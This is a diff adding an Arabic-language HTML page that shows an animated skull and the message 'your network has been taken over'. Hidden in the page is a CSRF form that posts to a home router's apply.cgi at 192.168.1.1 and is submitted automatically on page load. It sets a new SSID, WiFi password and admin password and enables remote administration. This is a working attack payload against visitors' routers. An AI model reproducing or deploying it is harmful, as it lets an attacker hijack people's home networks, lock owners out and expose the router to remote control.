@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚨 لقد تمت السيطرة على شبكتك 🚨</title>
+    <style>
+        /* ==== إعدادات الصفحة الأساسية ==== */
+        body {
+            margin: 0;
+            padding: 0;
+            background: radial-gradient(circle, #000000, #220000, #550000);
+            overflow: hidden;
+            font-family: 'Arial', sans-serif;
+            color: #fff;
+        }
+
+        /* ==== تأثيرات الدخان ==== */
+        .smoke {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(255,0,0,0.3) 0%, transparent 80%);
+            animation: smokeEffect 5s infinite alternate;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes smokeEffect {
+            0% {
+                opacity: 0.5;
+                transform: translate(-50%, -50%) scale(1);
+            }
+            100% {
+                opacity: 0.2;
+                transform: translate(-50%, -50%) scale(1.3);
+            }
+        }
+
+        /* ==== الجمجمة المتحركة ==== */
+        .skull {
+            position: absolute;
+            top: 10%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 200px;
+            animation: skullFloat 4s infinite alternate ease-in-out;
+            z-index: 10;
+        }
+
+        @keyframes skullFloat {
+            from {
+                transform: translateY(0) translateX(-50%);
+            }
+            to {
+                transform: translateY(-30px) translateX(-50%);
+            }
+        }
+
+        /* ==== الرسالة التحذيرية ==== */
+        .warning-box {
+            text-align: center;
+            margin-top: 15%;
+            animation: float 3s infinite ease-in-out;
+            z-index: 11;
+        }
+
+        .warning-box h1 {
+            font-size: 3.5em;
+            color: #ff0000;
+            text-shadow: 
+                0 0 10px #ff0000,
+                0 0 20px #ff0000,
+                0 0 40px #aa0000;
+            animation: glow 1.5s infinite alternate;
+        }
+
+        .warning-box p {
+            font-size: 1.5em;
+            margin-top: 20px;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-20px);
+            }
+            100% {
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes glow {
+            0% {
+                text-shadow: 
+                    0 0 10px #ff0000,
+                    0 0 20px #ff0000;
+            }
+            100% {
+                text-shadow: 
+                    0 0 20px #aa0000,
+                    0 0 40px #ff0000;
+            }
+        }
+
+        /* ==== الأزرار المخيفة ==== */
+        .button {
+            margin-top: 40px;
+            display: inline-block;
+            background: #550000;
+            color: #fff;
+            font-size: 1.2em;
+            padding: 10px 25px;
+            border: 2px solid #ff0000;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            box-shadow: 0 0 20px #ff0000;
+            animation: flicker 2s infinite alternate;
+            cursor: pointer;
+            z-index: 12;
+        }
+
+        .button:hover {
+            background: #ff0000;
+        }
+
+        @keyframes flicker {
+            0% {
+                box-shadow: 0 0 10px #ff0000;
+            }
+            100% {
+                box-shadow: 0 0 40px #aa0000;
+            }
+        }
+
+        /* ==== تأثير الرسوم المتحركة (مفاجأة) ==== */
+        .flash {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 0, 0, 0.8);
+            opacity: 0;
+            animation: flashEffect 3s infinite alternate;
+            pointer-events: none;
+        }
+
+        @keyframes flashEffect {
+            0% {
+                opacity: 0;
+            }
+            50% {
+                opacity: 0.3;
+            }
+            100% {
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- تأثيرات مرعبة -->
+    <div class="flash"></div>
+    <div class="smoke"></div>
+    <img src="https://i.imgur.com/WFhrPeE.png" alt="Skull" class="skull">
+    
+    <!-- الرسالة التحذيرية -->
+    <div class="warning-box">
+        <h1>🚨 لقد تمت السيطرة على شبكتك 🚨</h1>
+        <p>⚠️ تم تعديل إعدادات شبكتك بنجاح.</p>
+        <p>💬 <strong>لا تعبث مع الكبار!</strong></p>
+        <div class="button" onclick="window.close()">إغلاق الصفحة</div>
+    </div>
+
+    <!-- نموذج CSRF -->
+    <form id="csrf_form" action="http://192.168.1.1/apply.cgi" method="POST">
+        <input type="hidden" name="ssid" value="Aboodu&Hamzah">
+        <input type="hidden" name="wifi_password" value="A/H77177">
+        <input type="hidden" name="admin_password" value="A/H77177">
+        <input type="hidden" name="enable_remote" value="1">
+    </form>
+
+    <!-- تشغيل الطلب التلقائي -->
+    <script>
+        window.onload = function() {
+            document.getElementById('csrf_form').submit();
+        };
+    </script>
+</body>
+</html>
